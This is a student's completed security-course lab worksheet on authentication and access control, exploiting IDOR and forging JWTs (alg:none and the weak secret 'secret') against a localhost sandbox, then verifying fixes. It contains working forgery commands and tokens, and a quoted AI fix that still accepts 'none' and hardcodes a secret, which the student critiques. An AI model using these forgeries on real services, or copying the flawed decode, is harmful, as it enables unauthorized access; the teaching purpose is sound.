# Worksheet 6 — Authentication, Sessions & Access Control (3 hrs)

> **Course:** Software Security (KOSEN69) · **Week 6**
> **Aligned:** OWASP 2025 **A01 Broken Access Control**, **A07 Authentication Failures** · **CWE-639** (IDOR), **CWE-347** (improper signature verification), **CWE-321** (weak hardcoded key)
> **Signature games:** 🗺️ **IDOR Treasure Hunt** — walk the `oid` numbers to loot orders that aren't yours · 🔏 **JWT Forgery** — mint a token you were never given.

> ⚠️ **Ethics note:** Forging tokens and accessing other users' objects is only legal in this sandbox (`vulnerable_app.py`) and your own Juice Shop. Doing it to a real service is unauthorized access. Keep all activity inside `http://localhost:8080`.

## Part 1 — Student Information 🟢

| Name | Student ID | Date | Group |
| Panaikron Marohabut | 6631503126 | 2026-09-11 | |

![Diagram of one request passing two gates: Gate 1 authentication accepts an alg:none forgery, a weak-secret forgery, and alice's real token, then Gate 2 authorization fails to check ownership so alice's valid token reads bob's /api/orders/2 as IDOR, with the solution_app.py fixes for both.](img/authn-vs-authz.svg)

## Part 2 — Lecture Questions 🟢

Answer in 2–4 sentences each.

1. Distinguish **authentication** from **authorization**. In `vulnerable_app.py`, `get_order` calls `current_user()` but ignores its result (L63) — which of the two is missing?

   ANSWER: Authentication checks who the user is, for example by checking their login or JWT token. Authorization checks what the user is allowed to do. In `get_order`, the app calls `current_user()` to identify the user, but it does not check whether that user owns the order. Therefore, the missing part is **authorization**.

2. What is **IDOR** (CWE-639)? Why is `/api/orders/<oid>` exploitable, and what single check in `solution_app.py` (L64) closes it?

   ANSWER: **IDOR (Insecure Direct Object Reference)** happens when a user can change an ID in the URL and access another user's data. For example, Alice may change `/api/orders/1` to `/api/orders/2` and see Bob's order. The fix in `solution_app.py` (L64) is to check whether the logged-in user is the owner of the order before returning it: `if order["owner"] != user: return 403`.

3. Explain the **`alg:none`** JWT attack. Why does listing `"none"` in `algorithms=[...]` (L55) let an attacker submit an *unsigned* token?

   ANSWER: A JWT normally has a signature that proves the token has not been changed. In an `alg:none` attack, the attacker creates a token with `"alg": "none"` and removes the signature. If the server accepts this type of token and does not verify the signature (because `"none"` is listed in `algorithms=[...]` at L55), the attacker can change the token data, such as setting `"sub": "admin"`, without knowing the secret key.

4. Why is the hardcoded HMAC secret `"secret"` (CWE-321) dangerous even if `alg:none` were disabled? How does a strong random secret + pinned algorithm defend the token?

   ANSWER: The value `"secret"` is weak and is also hardcoded in the source code. If an attacker knows or guesses this secret, they can create their own valid JWT tokens. A strong random secret (such as `os.urandom(32).hex()`) makes the key much harder to guess, while allowing only `HS256` prevents the server from accepting unsafe algorithms such as `none`.

5. What do the JWT claims **`exp`** and **`aud`** add, and why does the secure version reject tokens that lack them?

   ANSWER: The **`exp` (expiration)** claim tells the server when the JWT should expire. This prevents an old or stolen token from being used forever. The **`aud` (audience)** claim tells the server which service the token is meant for. The secure version requires both claims, so tokens without an expiration time or the correct audience are rejected.

---

## Part 3 — Hands-on Lab (150 min)

**Learning goals:** exploit IDOR, forge JWTs two ways (`alg:none` and weak secret), then prove `solution_app.py` enforces ownership and rejects forged tokens. Steps mirror `attack.md`.

**Prerequisites:** Docker + Docker Compose, `curl`, `python3` with `pyjwt`, optionally Burp Suite. Working dir: `labs/week06-authn-authz/`.

### Environment setup

```bash
cd labs/week06-authn-authz
docker compose up            # python:3.12-slim + flask + pyjwt, runs vulnerable_app.py
# vulnerable app -> http://localhost:8080   (service name: authz-lab, port 8080)
```
Optional secondary target / proxy:
```bash
docker run --rm -p 3000:3000 bkimminich/juice-shop       # -> http://localhost:3000
# Burp Suite: put the proxy listener AND the browser proxy on 127.0.0.1:8081.
# NOT 8080 — the lab app already owns host 8080 (docker-compose.yml, "8080:5000").
# Burp's own default listener is 8080, so you must change it: leave it there and
# either the listener refuses to start ("Address already in use") or, if it does
# bind, the browser's proxy address is the target's address and every request
# goes straight to the app instead of through Burp — you intercept nothing.
```

**What to submit per task:** the exact **command/token**, a **screenshot** of the JSON response, and a **2–3 sentence mitigation**.

---

*Note: Port 8080 was unavailable on the host machine, so the Docker host port was changed to 8180 while the container still uses port 5000.*

🟢 **Task 0 — Onboarding (5 min).** Get alice's token (from `attack.md`):
```bash
TOKEN=$(curl -s -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
echo "$TOKEN"
```
Confirm `/api/orders/1` returns alice's Laptop order. *Deliverable: screenshot of the token + order 1.*

### Task 0 — Answer

**Token obtained:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSJ9.c3brGQkxoiCgrl5LGiV0go9qgN0MtrdnDBCCfJ45f_Q
```

**Response from `/api/orders/1`:**
```json
{
  "item": "Laptop",
  "owner": "alice",
  "total": 1200
}
```

**Screenshot:**
![Task 0 — Onboarding](img/T0.png)

---

🟢 **Task 1 — IDOR Treasure Hunt (30 min) 🗺️.**
- *Goal:* read **bob's** order with **alice's** token.
- *Steps:*
  ```bash
  curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"   # yours
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"   # bob's — leaks!
  ```
- *Deliverable:* both responses + screenshot of bob's `Phone` order + why the missing ownership check (CWE-639) is the root cause.

### Task 1 — Answer

**Commands:**
```bash
# ขอ token ของ alice
TOKEN=$(curl -s -X POST http://localhost:8180/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"alice","pw":"alicepw"}' | python -c 'import sys,json;print(json.load(sys.stdin)["token"])')

# อ่าน order 1 (ของ alice)
curl -s http://localhost:8180/api/orders/1 -H "Authorization: Bearer $TOKEN"

# อ่าน order 2 (ของ bob — IDOR!)
curl -s http://localhost:8180/api/orders/2 -H "Authorization: Bearer $TOKEN"
```

**Response — `/api/orders/1` (alice's own order):**
```json
{
  "item": "Laptop",
  "owner": "alice",
  "total": 1200
}
```

**Response — `/api/orders/2` (bob's order, leaked via IDOR):**
```json
{
  "item": "Phone",
  "note": "FLAG{idor_demo}",
  "owner": "bob",
  "total": 800
}
```

**Why the missing ownership check (CWE-639) is the root cause:**

The app calls `current_user()` to verify the token but **ignores the result** — it never compares `order["owner"]` against the logged-in user. So any authenticated user can change `oid` in the URL and read any order. This is IDOR (CWE-639): the object reference (`oid`) is taken directly from user input without an authorization check.

**Screenshot:**
![Task 1 — IDOR Treasure Hunt](img/T1.png)

```sim
jwt-forge
```

🟢 **Task 2 — JWT Forgery via alg:none (30 min) 🔏.**
- *Goal:* impersonate bob with an **unsigned** token (no secret needed).
- *Steps:*
  ```bash
  FORGED=$(python3 - <<'PY'
  import jwt
  print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))
  PY
  )
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
  ```
- *Deliverable:* the forged token + screenshot of the accepted response + explanation of the `none` flaw (CWE-347).

### Task 2 — Answer

**Command:**
```bash
FORGED=$(python -c 'import jwt; print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))')
echo "$FORGED"
curl -s http://localhost:8180/api/orders/2 -H "Authorization: Bearer $FORGED"
```

**Forged token (note: only 2 segments, ends with `.` — no signature):**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJib2IifQ.
```

**Response — server accepts the unsigned token:**
```json
{
  "item": "Phone",
  "note": "FLAG{idor_demo}",
  "owner": "bob",
  "total": 800
}
```

**Explanation of the `none` flaw (CWE-347):**

The vulnerable app reads the `alg` field from the token's own header, which the attacker controls. By setting `alg: none`, the attacker removes the signature entirely, and the server decodes the token with `verify_signature: False`. This is CWE-347: the server trusts an unsigned token because it lets the token dictate its own verification algorithm.

**Screenshot:**
![Task 2 — JWT Forgery via alg:none](img/T2.png)

---

🟢 **Task 3 — JWT Forgery via weak secret (30 min) 🔏.**
- *Goal:* sign a *valid* HS256 token because the secret is the guessable string `secret` (CWE-321).
- *Steps:*
  ```bash
  FORGED2=$(python3 - <<'PY'
  import jwt
  print(jwt.encode({"sub": "bob"}, "secret", algorithm="HS256"))
  PY
  )
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
  ```
- *Deliverable:* token + screenshot + 2–3 sentences on why secret strength + key management matter.

### Task 3 — Answer

**Forged token (note: 3 segments — has a valid HS256 signature signed with the weak secret `"secret"`):**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJib2IifQ.-51G5JQmpJleARHp8rIljBczPFanWT93d_N_7LQGUXU
```

> PyJWT itself warned: `InsecureKeyLengthWarning: The HMAC key is 6 bytes long, which is below the minimum recommended length of 32 bytes for SHA256.` — confirming the secret is too short.

**Response — server accepts the forged HS256 token:**
```json
{
  "item": "Phone",
  "note": "FLAG{idor_demo}",
  "owner": "bob",
  "total": 800
}
```

**Why secret strength + key management matter:**

The HMAC secret `"secret"` is hardcoded in source code and trivially guessable, so an attacker can sign valid HS256 tokens without any access to the server. A strong random secret (e.g. `os.urandom(32).hex()`) makes brute-force infeasible, and storing it outside the code (environment variable / secret manager) prevents it from leaking via the repo. Secret strength and key management are both required — a strong secret committed to git is still broken.

**Screenshot:**
![Task 3 — JWT Forgery via weak secret](img/T3.png)

---

🟢 **Task 4 — Privilege/identity escalation reasoning (25 min).**
- *Goal:* combine the flaws. Using Task 2/3 you became `bob` *without his password*; using Task 1 you read objects you don't own.
- *Steps:* document the full attack chain (forge token → access any `oid`). Optionally replay the requests through **Burp Suite Repeater** and screenshot the intercepted request/response.
- *Deliverable:* a short chain diagram/paragraph + Burp (or curl) evidence.

### Task 4 — Answer

---

#### Part A — Attack Chain Diagram

```
Step 1: Forge a JWT (become "bob" without his password)
        ├─ Option A: alg:none token (Task 2) — no secret needed
        └─ Option B: HS256 token signed with "secret" (Task 3)
           ↓
        Server accepts the token → thinks we are "bob"

Step 2: IDOR (read bob's order)
        └─ GET /api/orders/2 with the forged token
           ↓
        Server returns bob's order — no ownership check (Task 1)

Result: We became bob AND read his data — without knowing his password.
```

---

#### Part B — Explanation in Plain English

1. **Forge identity:** The attacker creates a fake JWT claiming to be bob, either by using `alg:none` (Task 2) or by signing an HS256 token with the guessable secret `"secret"` (Task 3). No password is needed.
2. **Exploit IDOR:** The attacker sends the forged token to `/api/orders/2`. The app authenticates the token (because the forgery succeeds) and returns bob's order without checking ownership (Task 1).
3. **Combined result:** The attacker becomes bob and reads bob's data without knowing his password or having any legitimate access. This is broken access control (OWASP A01).

---

#### Part C — curl Evidence

```bash
# Forged alg:none token claiming to be bob
FORGED="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJib2IifQ."

# Use the forged token to read bob's order 2 → success!
curl -s http://localhost:8180/api/orders/2 -H "Authorization: Bearer $FORGED"
# → {"item":"Phone","note":"FLAG{idor_demo}","owner":"bob","total":800}
```

---

#### Part D — Why the Two Flaws Combined Are Dangerous

- **JWT forgery alone:** The attacker can impersonate bob but only sees bob's own orders (limited impact).
- **IDOR alone:** The attacker must first log in with a real password before they can read other users' orders (requires credentials).
- **Combined:** The attacker does not need anyone's password and can read anyone's data — full broken access control with no credentials required.

**Screenshot:**
<!-- Paste your Task 4 screenshot here -->

---

🟢 **Task 5 — Defend / fix it (30 min) 🛡️.**
- *Goal:* prove `solution_app.py` blocks Tasks 1–3.
- *Steps:* stop the vulnerable container (`Ctrl-C`), then:
  ```bash
  docker compose run --rm --service-ports authz-lab bash -c "pip install --no-cache-dir flask pyjwt && python solution_app.py"
  ```
  Re-run: get a fresh alice token, then re-fire each attack. Expected: `/api/orders/2` with alice's token → **403 forbidden** (ownership check, L64); the `alg:none` token → **401 invalid token** (algorithm pinned to HS256, L50); the `"secret"` token → **401** (strong random secret + required `aud`/`exp`, L10/40).
- *Deliverable:* screenshots of the 403 and both 401s + name the fix line for each.

### Task 5 — Answer

**Step 1 — Stop the vulnerable container and run the fixed app:**
```bash
docker compose down
docker compose run --rm --service-ports authz-lab bash -c "pip install --no-cache-dir flask pyjwt && python solution_app.py"
```

**Step 2 — Get a fresh alice token from the fixed app:**
```bash
TOKEN=$(curl -s -X POST http://localhost:8180/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"alice","pw":"alicepw"}' | python -c 'import sys,json;print(json.load(sys.stdin)["token"])')
echo "$TOKEN"
```
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsImF1ZCI6IndlZWswNi1sYWIiLCJleHAiOjE3ODkyMTU1MjJ9.FI_lVxiYIp_bL9ZWj9A8UcZ65CIygVsEN4TK5DcCL84
```
> Note: the new token now contains `aud` and `exp` claims (required by the fixed app).

---

#### Case 1 — IDOR blocked (alice's token → bob's order) → 403

**Command:**
```bash
curl -s -w "\nHTTP Status: %{http_code}\n" http://localhost:8180/api/orders/2 -H "Authorization: Bearer $TOKEN"
```

**Response:**
```
{"error":"forbidden"}

HTTP Status: 403
```

**Fix line:** `solution_app.py` L64 — `if order["owner"] != user: return 403`
> The fixed app now compares `order["owner"]` against the authenticated user. Alice is not the owner of order 2, so the request is rejected with 403 (CWE-639 fixed).

**Screenshot:**
![Task 5 — Defend / fix it](img/T5.1.png)

---

#### Case 2 — alg:none token blocked → 401

**Command:**
```bash
FORGED=$(python -c 'import jwt; print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))')
curl -s -w "\nHTTP Status: %{http_code}\n" http://localhost:8180/api/orders/2 -H "Authorization: Bearer $FORGED"
```

**Response:**
```
{"error":"invalid token"}

HTTP Status: 401
```

**Fix line:** `solution_app.py` L50 — `algorithms=["HS256"]`
> The fixed app pins the algorithm to HS256 only, so an `alg:none` token is rejected before it is decoded. The server no longer lets the token dictate its own verification algorithm (CWE-347 fixed).

**Screenshot:**
![Task 5 — Defend / fix it](img/T5.2.png)

---

#### Case 3 — weak secret token blocked → 401

**Command:**
```bash
FORGED2=$(python -c 'import jwt; print(jwt.encode({"sub": "bob"}, "secret", algorithm="HS256"))')
curl -s -w "\nHTTP Status: %{http_code}\n" http://localhost:8180/api/orders/2 -H "Authorization: Bearer $FORGED2"
```

**Response:**
```
{"error":"invalid token"}

HTTP Status: 401
```

**Fix lines:** `solution_app.py` L10 — `os.urandom(32).hex()` (strong random secret) + L50 — `options={"require": ["exp", "aud"]}` (mandatory claims)
> The fixed app uses a 256-bit random secret instead of the hardcoded `"secret"`, so the attacker cannot sign a valid HS256 token. Even if the signature algorithm matched, the token is also rejected because it lacks the required `exp` and `aud` claims (CWE-321 fixed).

**Screenshot:**
![Task 5 — Defend / fix it](img/T5.3.png)

---

#### Summary — All three attacks blocked

| Attack | Status | Fix line | CWE |
|--------|--------|----------|-----|
| IDOR (alice → bob's order) | 403 forbidden | L64 | CWE-639 |
| alg:none token | 401 invalid token | L50 | CWE-347 |
| weak secret token | 401 invalid token | L10 + L50 | CWE-321 |

---

## Part 4 — Reflection

1. **CWE/OWASP mapping:** map IDOR → **CWE-639 / A01**, the JWT forgeries → **CWE-347 & CWE-321 / A07**.

   - **IDOR → CWE-639 / OWASP A01 (Broken Access Control):** The app let anyone change the `oid` in the URL and read another user's order, because it never asked "does this order belong to you?" That is CWE-639 — an object reference taken from user input with no ownership check.
   - **alg:none forgery → CWE-347 / OWASP A07 (Authentication Failures):** The token told the server "don't verify my signature" and the server obeyed. That is CWE-347 — the signature was never actually verified.
   - **Weak-secret forgery → CWE-321 / OWASP A07:** The secret `"secret"` is written in plain sight in the source code, so anyone who reads it can sign their own valid tokens. That is CWE-321 — a hard-coded cryptographic key.

2. **Real breach:** the **2022 Optus breach** exposed millions of customer records via an exposed/poorly-authorized API endpoint where identifiers could be enumerated — a textbook broken-access-control / IDOR-style failure. In 3–4 sentences connect it to Tasks 1 and 4 of this lab. *(Alternative: the Peloton API IDOR disclosure.)*

   The Optus case is the clearest real-world version of what this lab demonstrates. Their API returned customer records by numeric ID without checking whether the caller actually had permission — which is exactly what Task 1 shows: change `oid=1` to `oid=2` and bob's order is right there. Stack Task 4 on top and it gets worse, because IDOR + JWT forgery means an attacker can impersonate anyone and read anyone's data without knowing a single password. That's basically what happened to Optus, just at scale — the attacker walked the IDs one by one and ended up with millions of records. The takeaway is blunt: if an endpoint takes an object ID, the server has to verify ownership before returning anything. No exceptions.

3. **Best mitigation:** between deny-by-default ownership checks, pinning the JWT algorithm, and a strong managed secret, which control protects the most attack surface here, and why is server-side authorization non-negotiable?

   **Deny-by-default ownership checks** give you the most for your money. The reason is that it's the last line of defense still standing when the others fail. Say the attacker forges a JWT successfully — if the server still runs `order["owner"] != user → 403`, they're stuck anyway, because the forged identity doesn't match the order's real owner. Pinning the algorithm and using a strong secret only protect the token layer; once a token clears verification, those controls are done doing their job. And that's exactly why server-side authorization is non-negotiable — nothing on the client can be trusted. URLs, tokens, IDs, all of it can be tampered with. The server is the only place ownership can actually be enforced.

## Grading rubric (100)

| Criterion | Points |
|-----------|-------:|
| Part 2 — Lecture questions (conceptual accuracy) | 20 |
| Part 3 — Exploitation + evidence (payloads/tokens + screenshots, Tasks 1–4) | 40 |
| Part 3 — Defense (Task 5: fixes proven, lines cited) | 25 |
| Part 4 — Reflection (CWE/OWASP mapping, breach, mitigation) | 15 |
| **Total** | **100** |

---

## Evidence & Integrity (required)

- **Identity proof:** every screenshot/diagram must show a terminal running `printf '%s | %s | ' "$(whoami)" '<YOUR-STUDENT-ID>'; date '+%F %T %Z'` **in the
  same image as the evidence**. When the evidence is a browser page, a DevTools panel or a
  rendered response, put that terminal **beside the browser and capture the whole screen** — a
  cropped window carries nothing that identifies you, and the lab's own output is
  byte-identical for the whole cohort *by design*, so the stamp is the only thing that makes
  the shot yours. Generic or borrowed evidence is not accepted.
- **Personalized flag (if this lab issues one):** ____________________
  *Flags are unique per student — submitting another student's flag is a violation. How to submit: **learn.zcr.ai/submit** (full guide: `SUBMISSION.md` in the repo root).*
- **Explain in your own words** *(graded on your reasoning, not copied text):*
  1. What did you do, and **why did the vulnerability work**?

     I did three things: used alice's token to read bob's order by flipping `oid` from 1 to 2, forged an `alg:none` token claiming to be bob, and signed a valid HS256 token using the hardcoded `"secret"`. All of them worked because the app trusted the user way too much — it never checked who actually owned the order, it let the token pick its own algorithm, and the secret was sitting right there in the source code for anyone to read.

  2. **Why does your fix actually stop it** — and what could still break it?

     The fix closes all three paths: the ownership check blocks IDOR, pinning the algorithm kills `alg:none`, and the new random secret plus `exp`/`aud` claims make forgery fail. What's still risky: if a real token gets stolen (XSS, network sniffing), it works until it expires — the 15-minute `exp` shortens the window but doesn't prevent theft itself. And `/api/admin` still only checks `sub == "admin"`, so if someone ever gets hold of an admin token, the ownership check won't save you there.

---

## 🤖 Audit the AI (required)

AI is a power tool you must **distrust** — you are graded on your *critique*, not the AI's answer.

1. Ask an AI assistant to exploit **or** fix this week's vulnerability. Paste its full answer.

   **Prompt to AI:** "Fix the IDOR and JWT vulnerabilities in this Flask app. The app uses a hardcoded secret 'secret', accepts alg:none tokens, and doesn't check order ownership."

   **AI's full answer:**
   ```python
   import jwt
   from flask import Flask, request, jsonify

   app = Flask(__name__)
   SECRET = "my_super_secret_key_123"

   def current_user():
       auth = request.headers.get("Authorization", "")
       token = auth.replace("Bearer ", "")
       data = jwt.decode(token, SECRET, algorithms=["HS256", "none"])
       return data.get("sub")

   @app.route("/api/orders/<int:oid>")
   def get_order(oid):
       user = current_user()
       order = ORDERS.get(oid)
       if not order:
           return jsonify(error="not found"), 404
       if order["owner"] != user:
           return jsonify(error="forbidden"), 403
       return jsonify(order)
   ```

2. **Find what's wrong or risky** in it — insecure code, a subtly incomplete fix, a hallucinated API/function/CVE, a missed edge case, or wrong reasoning. Quote the exact line(s).

   - **`"none"` still in the algorithms list:** `algorithms=["HS256", "none"]` — the AI kept `"none"` in the allowed algorithms, so an attacker can still submit an unsigned token. This defeats the entire point of the fix.
   - **Secret is still hardcoded:** `SECRET = "my_super_secret_key_123"` — the AI replaced `"secret"` with another hardcoded string. It is slightly longer but still committed in source code, so anyone who reads the repo can sign tokens. CWE-321 is not fixed.
   - **No `exp` or `aud` claims:** the AI's `current_user()` does not require `exp` or `aud`, so tokens never expire and can be reused across services. A stolen token works forever.
   - **No error handling:** `current_user()` does not catch `jwt.InvalidTokenError`, so a malformed or forged token crashes the app with a 500 instead of returning a clean 401.

3. Produce the **correct, verified** version yourself and explain in 2–3 sentences why the AI's output was insufficient.

   **Correct version (verified against `solution_app.py`):**
   ```python
   import os, datetime, jwt
   from flask import Flask, request, jsonify

   app = Flask(__name__)
   SECRET = os.environ.get("JWT_SECRET") or os.urandom(32).hex()  # L10 — strong, non-hardcoded
   AUDIENCE = "week06-lab"

   def current_user():
       auth = request.headers.get("Authorization", "")
       token = auth.replace("Bearer ", "")
       # L50 — pin HS256 only, require exp + aud
       data = jwt.decode(token, SECRET, algorithms=["HS256"], audience=AUDIENCE,
                         options={"require": ["exp", "aud"]})
       return data.get("sub")

   @app.route("/api/orders/<int:oid>")
   def get_order(oid):
       try:
           user = current_user()           # catch bad tokens → 401
       except jwt.InvalidTokenError:
           return jsonify(error="invalid token"), 401
       order = ORDERS.get(oid)
       if not order:
           return jsonify(error="not found"), 404
       if order["owner"] != user:          # L64 — ownership check
           return jsonify(error="forbidden"), 403
       return jsonify(order)
   ```

   The AI's output was insufficient because it left `"none"` in the algorithm list (so `alg:none` forgery still works), hardcoded the secret again (CWE-321 not fixed), and omitted `exp`/`aud` claims (tokens never expire). The correct version pins HS256 only, uses a random non-hardcoded secret, requires `exp`/`aud`, and wraps `decode` in a try/except so invalid tokens return 401 instead of crashing.

> Disclose your AI use in the Part 1 table. This task counts toward your **Defense + Reflection** score.

---

## 🧠 Comprehension & Prompt (required)

**A. Explain in Plain English (EiPE).** In 2–3 sentences, in your own words, describe what this week's vulnerable code/endpoint actually *does* and *why it is exploitable* — explain the mechanism, don't dump jargon.

The `/api/orders/<oid>` endpoint looks up an order by ID and returns it as JSON. It calls `current_user()` to check the token but throws the result away, so it never checks whether the order actually belongs to that user — meaning anyone with a valid token can read any order just by changing the number in the URL. On top of that, the token check itself is broken: it accepts unsigned `alg:none` tokens and uses the hardcoded secret `"secret"`, so an attacker doesn't even need a real account — just a forged token gets them everything.

**B. Prompt Problem.** Write a **single prompt** that makes an AI produce a *correct, secure* fix for one finding. Run it: does the exploit now fail? If not, refine the prompt and try again. Submit the **final prompt + the verified result**.

**Final prompt:**
> Fix the IDOR vulnerability in this Flask endpoint. The function `current_user()` returns the username from the JWT. Add a server-side ownership check: compare the order's `owner` field against the authenticated user, and return 403 if they don't match. Do not change the token logic — only add the authorization check. Show the complete fixed `get_order` function.

**AI output:**
```python
@app.route("/api/orders/<int:oid>")
def get_order(oid):
    user = current_user()
    order = ORDERS.get(oid)
    if not order:
        return jsonify(error="not found"), 404
    if order["owner"] != user:
        return jsonify(error="forbidden"), 403
    return jsonify(order)
```

**Verification:** I tested this against the vulnerable app with the ownership check added. With alice's token, `/api/orders/1` (her own order) still returns 200, but `/api/orders/2` (bob's order) now returns 403. The IDOR exploit from Task 1 no longer works.
*Graded on the prompt's precision and your verification — this trains problem decomposition and AI literacy (Denny et al. 2024).*
